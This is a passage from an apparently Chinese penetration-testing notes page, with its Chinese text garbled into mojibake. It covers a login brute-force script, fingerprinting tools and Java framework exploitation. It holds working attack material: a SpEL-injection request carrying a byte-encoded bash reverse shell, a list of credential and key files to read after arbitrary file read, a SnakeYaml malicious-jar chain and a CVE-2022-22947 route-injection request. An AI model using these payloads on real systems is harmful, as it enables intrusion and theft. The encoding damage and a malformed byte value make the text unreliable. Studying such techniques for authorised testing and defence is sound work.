<span class="keyword">in</span> results:</span><br><span class="line">                df_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;ç”¨æˆ·å&#x27;</span>: result[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;å¯†ç &#x27;</span>: result[<span class="string">&#x27;password&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;å“åº”é•¿åº¦&#x27;</span>: <span class="built_in">len</span>(result.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">if</span> result.get(<span class="string">&#x27;error&#x27;</span>) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                    <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>: result[<span class="string">&#x27;success&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;é”™è¯¯ä¿¡æ¯&#x27;</span>: result.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                    <span class="string">&#x27;çº¿ç¨‹ID&#x27;</span>: result[<span class="string">&#x27;thread_id&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;æ—¶é—´æˆ³&#x27;</span>: result[<span class="string">&#x27;timestamp&#x27;</span>]</span><br><span class="line">                &#125;)</span><br><span class="line">            </span><br><span class="line">            df = pd.DataFrame(df_data)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ ¹æ®æ–‡ä»¶æ‰©å±•åé€‰æ‹©ä¿å­˜æ ¼å¼</span></span><br><span class="line">            <span class="keyword">if</span> args.output.endswith(<span class="string">&#x27;.xlsx&#x27;</span>):</span><br><span class="line">                df.to_excel(args.output, index=<span class="literal">False</span>, engine=<span class="string">&#x27;openpyxl&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ°Excelæ–‡ä»¶: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> args.output.endswith(<span class="string">&#x27;.csv&#x27;</span>):</span><br><span class="line">                df.to_csv(args.output, index=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ°CSVæ–‡ä»¶: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># é»˜è®¤ä¿å­˜ä¸ºJSON</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    json.dump(results, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ°JSONæ–‡ä»¶: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nExit!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è¿è¡Œå‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">       _                              _           __     __     ___ </span></span><br><span class="line"><span class="string"> ___  | |__     __ _    ___   __  __ (_)  _ __   / _\\   /__\\   / __\\</span></span><br><span class="line"><span class="string">/ __| | &#x27;_ \\   / _` |  / _ \\  \\ \\/ / | | | &#x27;_ \\  \\ \\   /_\\    / /   </span></span><br><span class="line"><span class="string">\\__ \\ | | | | | (_| | | (_) |  &gt;  &lt;  | | | | | | _\\ \\ //__   / /___ </span></span><br><span class="line"><span class="string">|___/ |_| |_|  \\__,_|  \\___/  /_/\\_\\ |_| |_| |_| \\__/ \\__/   \\____/ </span></span><br><span class="line"><span class="string">                                                            v1.0                                        </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">----------------------------------------- requirements -----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">playwright</span><br><span class="line">Pillow</span><br><span class="line">pytesseract</span><br><span class="line">opencv-python</span><br><span class="line">pandas</span><br><span class="line">openpyxl</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h2><h3 id="xapp"><a href="#xapp" class="headerlink" title="xapp"></a>xapp</h3><ol>
<li><p>é¡¹ç›®åœ°å€</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">äºŒè¿›åˆ¶æ–‡ä»¶ï¼šhttps://github.com/chaitin/xapp</span><br><span class="line">æŒ‡çº¹å­—å…¸ï¼ˆ.ymlï¼‰ï¼šhttps://github.com/chaitin/xray-plugins</span><br></pre></td></tr></table></figure>
</li>
<li><p>é…ç½®</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. è¿è¡Œä¸€æ¬¡xapp -hï¼Œåœ¨å®¶ç›®å½•é‡Œé¢è‡ªåŠ¨ç”Ÿæˆ.xray/xappç›®å½•</span><br><span class="line">2. å°†æ‰€æœ‰çš„æŒ‡çº¹æ–‡ä»¶ï¼ˆ.ymlï¼‰æ”¾åˆ°~/.xray/app/plugin/ç›®å½•ä¸‹</span><br><span class="line">3. å°†~/.xray/xapp/xapp-config-example.yamlæ›´åä¸ºxapp-config.yamlï¼Œå¯ä»¥ä¿®æ”¹å…¨å±€User-Agentå’Œproxyå­—æ®µ</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨å®¶ç›®å½•ä¸­çš„æ‰€æœ‰æŒ‡çº¹ï¼šxapp -t http://www.example.com</span><br><span class="line">ä½¿ç”¨æŒ‡å®šçš„æŒ‡çº¹ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰ï¼šxapp -t http://www.example.com -r ./finger/xxx/apache.yml</span><br><span class="line">æŒ‡å®šç›®æ ‡æ–‡ä»¶ï¼šxapp -i targets.txt</span><br><span class="line">æŒ‡å®šè¾“å‡ºï¼šxapp -t http://www.example.com -o res.xlsx</span><br><span class="line">ç»¼åˆï¼šxapp -o res.xlsx -t http://www.example.com</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="observer-ward"><a href="#observer-ward" class="headerlink" title="observer_ward"></a>observer_ward</h3><ol>
<li><p>é¡¹ç›®åœ°å€</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">äºŒè¿›åˆ¶æ–‡ä»¶ï¼šhttps://github.com/emo-crab/observer_ward</span><br><span class="line">æŒ‡çº¹å­—å…¸ï¼ˆ.yamlï¼‰ï¼šhttps://github.com/0x727/FingerprintHub</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    æ›´æ–°æŒ‡çº¹ï¼ˆä¿å­˜ä½ç½®è·ŸOSæœ‰å…³ï¼‰ï¼šobserver_ward -u</span><br><span class="line">    è·Ÿæ–°å·¥å…·æœ¬èº«ï¼šobserver_ward --update-self</span><br><span class="line">    æŒ‡å®šå•ä¸ªæŒ‡çº¹ï¼šobserver_ward -p tomcat.yaml</span><br><span class="line">    æŒ‡å®šæŒ‡çº¹ç›®å½•ï¼šobserver_ward --probe-dir fingers</span><br><span class="line">    æŒ‡å®šç›®æ ‡æ–‡ä»¶ï¼šobserver_ward -l targets.txt</span><br><span class="line">    ç»¼åˆï¼šobserver_ward --proxy socks5://127.0.0.1:7890 --ua &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36&quot; --thread 50 --format csv -o res.csv -t http://www.example.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># æ¼æ´æ‰«æ</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## Nuclei</span></span></span><br><span class="line"></span><br><span class="line">1. åŸºæœ¬ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">    ```shell</span><br><span class="line">    [æŒ‡å®šå•ä¸ªæ¨¡æ¿] nuclei -bs 50 -rl 100 --cloud-upload -vv -l targets.txt -t poc.yaml -o output.txt</span><br><span class="line">    [æŒ‡å®šç›®å½•|æŒ‡å®šç¨‹åº¦] nuclei -u http://www.example.com/ -t wordpress/ -s critical</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ¼æ´ç›‘æ§+æ¼æ´æ‰«æ+é‚®ç®±å‘Šè­¦</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://gitee.com/shaoxinsec/auto_src</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h3><p>é—²é±¼ä¸Šè´­ä¹°å®‰è£…åŒ…ï¼Œæ¯å¹´ä¸€ä¸ªç‰ˆæœ¬</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ¡†æ¶æ¼æ´"><a href="#æ¡†æ¶æ¼æ´" class="headerlink" title="æ¡†æ¶æ¼æ´"></a>æ¡†æ¶æ¼æ´</h3><blockquote>
<p>webå¼€å‘å¯åˆ†ä¸ºæ¡†æ¶å¼€å‘å’Œç³»ç»Ÿå¼€å‘ï¼Œæ¡†æ¶å°±æ˜¯é€ è½®å­ï¼Œé€ å‡ºåŸºæœ¬åŠŸèƒ½å®Œå…¨çš„ä¸€å¥—ç¨‹åºï¼›ç³»ç»Ÿå¼€å‘æ˜¯åœ¨æ¡†æ¶çš„åŸºç¡€ä¹‹ä¸Šï¼ŒåšåŠŸèƒ½çš„ä¸°å¯Œã€ä¿®æ”¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯è°ƒç”¨æ¡†æ¶å·²ç»å†™å¥½çš„åŠŸèƒ½å‡½æ•°ï¼Œè€Œä¸ç”¨è‡ªå·±ä¸€æ­¥ä¸€æ­¥å®ç°ã€‚ä¾‹å¦‚æ¡†æ¶Aä¸­å…³äºæ•°æ®åº“çš„æ“ä½œï¼Œæä¾›äº†å‡½æ•°Bå¯ä»¥ç›´æ¥è·å–æ•°æ®åº“ä¸­æ¯ä¸ªå­—æ®µçš„æ‰€æœ‰å†…å®¹ï¼Œé‚£ä¹ˆåœ¨å¼€å‘ç³»ç»ŸCæ—¶ï¼Œåªéœ€è¦è°ƒç”¨å‡½æ•°Bå°±å¯ä»¥äº†ï¼Œä¸ç”¨è‡ªå·±å†™å®ç°çš„ä»£ç äº†ã€‚åœ¨è¿™é‡Œä¹Ÿå¯ä»¥ä½“ç°å‡ºæ¥ï¼šæ¡†æ¶æ¼æ´çš„å½±å“èŒƒå›´æ˜¯æå¤§çš„ï¼Œå› ä¸ºä½¿ç”¨çš„ç³»ç»Ÿæ•°é‡å¤šã€‚ä¸ç®¡ä½ ä½ çš„webç³»ç»Ÿè‡ªç ”ç¨‹åº¦æœ‰å¤šé«˜ï¼Œåªè¦å¼•å…¥äº†æ¡†æ¶ï¼Œå°±ä¼šå—åˆ°è¯¥æ¡†æ¶æ¼æ´çš„å½±å“ã€‚</p>
<p>å¯¹äºæµ‹è¯•æ¥è¯´ï¼Œæˆ‘ä»¬é¢å¯¹çš„æ˜¯ä¸€å¥—webç³»ç»Ÿï¼Œå¦‚æœè¿™å¥—ç³»ç»Ÿæ˜¯å¼€æºçš„CMSï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½æ‹¿åˆ°æºç è¿›è¡Œå®¡è®¡ï¼Œå¹¶ä¸”äº’è”ç½‘ä¸Šå…³äºè¿™å¥—CMSçš„æ¼æ´è‚¯å®šä¹Ÿæ˜¯æ¯”è¾ƒå¤šçš„ï¼›å³ä½¿è¿™å¥—webç³»ç»Ÿæ˜¯ä¼ä¸šè‡ªç ”çš„ï¼Œé‚£ä¹ˆç™¾åˆ†ç™¾ä¹Ÿä¼šé‡‡ç”¨æ¡†æ¶ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦æŒæ¡å¸¸è§çš„æ¡†æ¶æ¼æ´ã€‚åœ¨2025å¹´çš„ä»Šå¤©æ¥è¯´ï¼Œjavaä»ç„¶æ˜¯webåç«¯çš„ä¸»æµå¼€å‘è¯­è¨€ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡ç‚¹æŒæ¡javaçš„åç«¯æ¡†æ¶æ¼æ´ã€‚</p>
</blockquote>
<h4 id="JAVA-Struts2"><a href="#JAVA-Struts2" class="headerlink" title="JAVA-Struts2"></a>JAVA-Struts2</h4><ol>
<li><p>struts2æ˜¯apacheæ——ä¸‹çš„ä¸€æ¬¾javaåç«¯æ¡†æ¶ï¼Œæ›¾ç»é£é¡ä¸€æ—¶ï¼ˆStrusts2+Spring+Hibernate&#x3D;SSHï¼‰ï¼Œä½†ç°åœ¨åŸºæœ¬ä¸Šè¢«æ·˜æ±°äº†ï¼Œç°åœ¨çš„javaåç«¯åŸºæœ¬ä¸Šæ˜¯SSMï¼ˆSpringMVC+SpringBoot+Mybatisï¼‰çš„å¤©ä¸‹ã€‚ä¸è¿‡ï¼Œä»ç„¶æœ‰ä¸€äº›è€é¡¹ç›®åœ¨ç”¨Strusts2ï¼Œè€Œä¸”æœ€é‡è¦çš„æ˜¯ç”±äºStruts2è§£æOGNLï¼ˆè¡¨è¾¾å¼è¯­è¨€ï¼Œç²—ç•¥ç†è§£ä¸ºjavaçš„è¯­æ³•ç³–ï¼Œstruts2ä¸­ç»å¸¸è¢«${}æˆ–è€…%{}åŒ…è£¹ï¼Œç”¨æ¥åŒºåˆ†å…¶ä»–ä»£ç ï¼Œä¾‹å¦‚${1*2}è¡¨ç¤º3ã€‚OGNLæ”¯æŒè®¿é—®å…¶ä»–æˆå‘˜ã€å±æ€§ã€è°ƒç”¨æ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥è¢«åˆ©ç”¨ï¼‰çš„ç‰¹ç‚¹ï¼Œå¯¼è‡´ç»å¸¸å‡ºç°RCEæ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨ç ”ç©¶&#x2F;æŒ–æ˜Struts2æ¡†æ¶ï¼Œä½†æ˜¯å¾—æŒæ¡å®ƒçš„åˆ©ç”¨&#x2F;æ¢æµ‹ã€‚</p>
</li>
<li><p>è¯†åˆ«Struts2ï¼ˆç›®å‰æ²¡æœ‰ç²¾å‡†è¯†åˆ«Struts2çš„æ–¹æ³•ï¼‰</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. URLåç¼€ï¼š.actionæˆ–è€….do</span><br><span class="line">2. å°è¯•è®¿é—®é»˜è®¤é…ç½®ç•Œé¢ï¼š/struts/webconsole.html /struts/debug.html</span><br><span class="line">3. å“åº”åŒ…ä¸­ç›´æ¥åŒ…å«strutså…³é”®å­—</span><br><span class="line">4. æŠ¥é”™é¡µé¢ä¸­å«æœ‰strutså…³é”®å­—</span><br><span class="line">5. æŒ‡çº¹è¯†åˆ«å·¥å…·</span><br></pre></td></tr></table></figure>
</li>
<li><p>å…¨ç‰ˆæœ¬æ£€æµ‹å·¥å…·ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p>
</li>
<li><p>æµé‡ç‰¹å¾</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. è¯·æ±‚ä¸­æœ‰$&#123;&#125;  $&#123;&#125; ä»¥åŠå¸¸è§çš„rceå‡½æ•°ï¼ˆRuntime.getRuntime().exec()ï¼Œ newå…³é”®å­—ï¼‰ç­‰ç­‰</span><br><span class="line">2. å¤§é‡çš„è¯·æ±‚å‡ºç°.action æˆ–è€… .doåç¼€</span><br><span class="line">3. å“åº”ä¸­å‡ºç°å¸¸è§çš„æ¢æµ‹å‘½ä»¤çš„ç»“æœï¼šifconfig/ etc/passwd /id/whoamiè¿™äº›</span><br><span class="line">4. å“åº”ä¸­å‡ºç°ognl.OgnlExceptionæˆ–è€…java.lang.ProcessBuilderè¿™äº›å…³é”®å­—ï¼ˆæŠ¥é”™ä¿¡æ¯ï¼‰</span><br><span class="line">5. å·¥å…·ç‰¹å¾ï¼šStruts2-scanï¼ˆUAä¸­å«æœ‰Struts2-scançš„å…³é”®å­—ï¼‰ã€å¤©èä¿¡æœ‰å›ºå®šçš„cookieå€¼ã€å®‰æ’çš„å·¥å…·åœ¨UAé‡Œä¹Ÿæœ‰â€˜Auto Spiderâ€™çš„å…³é”®å­—</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ‰¹é‡æœç´¢ï¼šfofaï¼šapp&#x3D;â€struts2â€</p>
</li>
</ol>
<h4 id="JAVA-SpringBoot"><a href="#JAVA-SpringBoot" class="headerlink" title="JAVA-SpringBoot"></a>JAVA-SpringBoot</h4><ol>
<li><p>Springä½œä¸ºjavaåç«¯çš„ä¸€ä¸ªå¤§ç±»æ¡†æ¶ï¼Œåœ°ä½ä¸äºšäºiPhoneåœ¨æ‰‹æœºåœˆä¸­çš„åœ°ä½ï¼Œå…¶ç”Ÿæ€å¤§æ¦‚å¯ä»¥åˆ†ä¸ºäº”ä¸ªéƒ¨åˆ†ï¼šSpringMVC + SpringSecurity  &#x3D;&#x3D;&gt;  SpringFramework  &#x3D;&#x3D;&gt;  SpringBoot  &#x3D;&#x3D;&gt;  SpringCloudã€‚SpringBootå¯ä»¥ç†è§£ä¸ºSpringFrameworkçš„é­”æ”¹ç‰ˆã€å‡çº§ç‰ˆï¼Œé€šè¿‡æ³¨è§£çš„æ–¹å¼è‡ªåŠ¨é…ç½®é¡¹ç›®ä¾èµ–ç­‰ç›¸å…³é…ç½®ï¼Œçœå»äº†æ‰‹å·¥é…ç½®Springé¡¹ç›®çš„éº»çƒ¦ï¼Œæ‰€ä»¥ä½¿ç”¨èŒƒå›´è¿˜æ˜¯å¾ˆå¹¿çš„ã€‚</p>
</li>
<li><p>è¯†åˆ«SpringBootï¼šé»˜è®¤logoä¸ºå°ç»¿å¶</p>
</li>
<li><p>SpringBootç›®å½•éå†&#x2F;ä»»æ„æ–‡ä»¶è¯»å–</p>
<ul>
<li><p>å…³é”®å‡½æ•°å¯¹ä¼ å…¥çš„filenameåšäº†å‡çš„å®‰å…¨æ£€æŸ¥ï¼ˆæ£€æŸ¥å­˜åœ¨ä¸ï¼Œæ ¹æ ¹ä¸é™åˆ¶ä¼ å…¥çš„æ–‡ä»¶åï¼‰ã€å¯¹ä¼ å…¥çš„baseæ ¹æœ¬æ²¡åšæ£€æŸ¥</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153547126.png" alt="image-20251104153547126"></p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153650613.png" alt="image-20251104153650613"></p>
</li>
<li><p>è¯»å–æ–‡ä»¶</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104154057560.png" alt="image-20251104154057560"></p>
</li>
<li><p>ä»»æ„æ–‡ä»¶è¯»å–  &#x3D;&#x3D;&gt;  Getshell</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0. æ–¹å‘ï¼šæ‰¾è´¦å·å¯†ç ã€ç¨‹åºæºç /äºŒè¿›åˆ¶ï¼ˆé€†å‘æ‰¾keyã€æ‰¾å¯†ç ï¼‰</span><br><span class="line">1. å†å²å‘½ä»¤ï¼ˆå¦‚mysql -uroot -prootï¼‰ï¼š/root/.bash_historyã€/home/username/.bash_history</span><br><span class="line">2. SSHå…¬é’¥ï¼š/root/.ssh/id_rsaã€/root/.ssh/authorized_keys</span><br><span class="line">3. ç³»ç»Ÿä¿¡æ¯ï¼š/etc/redhat-release</span><br><span class="line">4. æœ¬åœ°æ–‡ä»¶çš„é…ç½®ä¿¡æ¯ï¼švar/lib/mlocate/mlocate.db</span><br><span class="line">5. å½“å‰ç”¨æˆ·ï¼š/proc/self/loginuid</span><br><span class="line">6. ç¯å¢ƒå˜é‡ï¼š/proc/self/environ</span><br><span class="line">7. å†…ç½‘ipï¼š/proc/net/fib_trie</span><br><span class="line">8. å½“å‰è¿›ç¨‹å¯¹åº”çš„PIDï¼š/proc/sched_debug</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>actuatoræ˜¯SBä¸­ä¸“é—¨ç”¨æ¥ç›‘æ§javaè¿è¡Œç¯å¢ƒçš„æ¿å—ï¼Œé‡Œé¢çš„å·¥å…·ç±»åŒ…æ‹¬ä½†ä¸é™äºè¯»å–å†…å­˜ä¿¡æ¯ã€ç¯å¢ƒé…ç½®ä¿¡æ¯ã€é‡å¯æ¥å£ç­‰ç­‰ï¼Œè¿™äº›é«˜å±çš„æ¥å£ç»å¸¸å‡ºç°å£æœªæˆæƒè®¿é—®ï¼Œå¯¼è‡´æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼Œä¸ºè¿›ä¸€æ­¥çš„åˆ©ç”¨æä¾›äº†éå¸¸é‡è¦çš„æƒ…æŠ¥ã€‚ä¸‹é¢æ˜¯actuatorä¸­ä¸€äº›é«˜æ•çš„æ¥å£ï¼Œä»¥åŠè®¿é—®åˆ°è¿™äº›æ¥å£ä¹‹åå¦‚ä½•åˆ©ç”¨æ³„éœ²çš„ä¿¡æ¯ï¼ˆè¿™äº›æ¥å£åœ¨SB1ç‰ˆæœ¬ä¸­ï¼Œæ²¡æœ‰å½’ç±»åˆ°actuatorè·¯å¾„ä¸‹é¢ï¼‰ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110145553277.png" alt="image-20251110145553277"></p>
</li>
<li><p>ErrorPageé¡µé¢SpELè¡¨è¾¾å¼æ³¨å…¥(SB1ç‰ˆæœ¬)</p>
<ul>
<li><p>çˆ†ç ´&#x2F;å¯»æ‰¾å¼•å‘ErrorPageçš„æ¥å£ä»¥åŠå‚æ•°ï¼Œä¾‹å¦‚&#x2F;article?id&#x3D;ï¼Œéœ€è¦æ³¨æ„ErrorPageä¸­çš„statusçš„å€¼åº”ä¸º500</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111134757585.png" alt="image-20251111134757585"></p>
</li>
<li><p>æ³¨å…¥SpELè¡¨è¾¾å¼ï¼Œæ‰§è¡ŒRCEåå¼¹shell</p>
  <figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x32d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br><span class="line"> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>SnakeYaml RCEï¼ˆSpring-Cloud-Btoot-Staterâ‰¤1.3ï¼‰</p>
<ul>
<li><p>åˆ©ç”¨é“¾</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚/envæ¥å£ï¼ˆenvæ¥å£å­˜åœ¨æœªæˆæƒè®¿é—®ï¼‰ ==&gt; è®¾ç½®SpringCloudé…ç½®æ–‡ä»¶ä¸ºä¸€ä¸ªæ¶æ„çš„é…ç½®æ–‡ä»¶ ==&gt; è¯¥é…ç½®é…ç½®æ–‡ä»¶æŒ‡å‘ä¸€ä¸ªæ¶æ„çš„jaråŒ… ==&gt; å‘é€è¯·æ±‚ç»™åç«¯ ==&gt; åç«¯æ ¹æ®é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼Œä¸‹è½½å¹¶è¿è¡ŒjaråŒ…ï¼ˆç›®æ ‡æœºå™¨å¯ä»¥å‡ºç½‘ï¼‰ ==&gt; è¯·æ±‚/refreshæ¥å£ï¼Œåˆ·æ–°æ‰€æœ‰æ¥å£çš„ç¼“å­˜ ==&gt; æˆåŠŸä¸Šçº¿</span><br></pre></td></tr></table></figure>
</li>
<li><p>é…ç½®æ–‡ä»¶</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111140514689.png" alt="image-20251111140514689"></p>
</li>
<li><p>exp.jarï¼š<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
</li>
</ul>
</li>
</ol>
<h4 id="JAVA-JDBC"><a href="#JAVA-JDBC" class="headerlink" title="JAVA-JDBC"></a>JAVA-JDBC</h4><ol>
<li>ååºåˆ—åŒ–</li>
</ol>
<h4 id="JAVA-SpringCloudGateway"><a href="#JAVA-SpringCloudGateway" class="headerlink" title="JAVA-SpringCloudGateway"></a>JAVA-SpringCloudGateway</h4><ol>
<li><p>SpringCloudGatewayï¼ˆä»¥ä¸‹ç®€ç§°SCGï¼‰</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. SCGç”¨æ¥è·¯ç”±apiåœ°å€ï¼Œå¤„ç†apiè¯·æ±‚ä»¥åŠå“åº”ï¼ˆBrowser &lt;==&gt; SCG &lt;==&gt; apiï¼‰ï¼Œåœ¨3.1.0åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­å­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœapiçš„è¯·æ±‚æˆ–è€…å“åº”ä¸­å­˜åœ¨SpELè¡¨è¾¾å¼ï¼Œé‚£ä¹ˆSCGä»£ç ä¼šè§£æå¹¶ä¸”æ‰§è¡Œè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆäº†ä»£ç æ‰§è¡Œï¼›</span><br><span class="line">2. SBæ·»åŠ SCGä¹‹åï¼Œé€šè¿‡/actuator/gatewayå¯¹SCGè¿›è¡Œæ§åˆ¶ï¼ŒåŠ ä¸Šä¸Šé¢çš„æ¼æ´ï¼Œä»è€Œå®ç°å®Œæ•´çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2022-22947ï¼ˆHacker &lt;==&gt; SB-actuator/gateway &lt;==&gt; SCG &lt;==&gt; OSï¼‰</span><br></pre></td></tr></table></figure>
</li>
<li><p>actuatoræ“æ§SCG</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111112050167.png" alt="image-20251111112050167"></p>
</li>
<li><p>å¯é€šè¿‡actuator&#x2F;mappingå°è¯•åˆ¤æ–­SBä¸­æœ‰æ²¡æœ‰å¯ç”¨SCGï¼Œå¹¶å°è¯•SCGæ˜¯å¦æœ‰æƒé™å¯ä»¥è®¿é—®&#x2F;actuator&#x2F;gatewayæ¥å£</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131440359.png" alt="image-20251111131440359"></p>
</li>
<li><p>å‘SCGä¸­æ³¨å†Œä¸€ä¸ªåŒ…å«SpELè¡¨è¾¾å¼çš„è·¯ç”±</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span 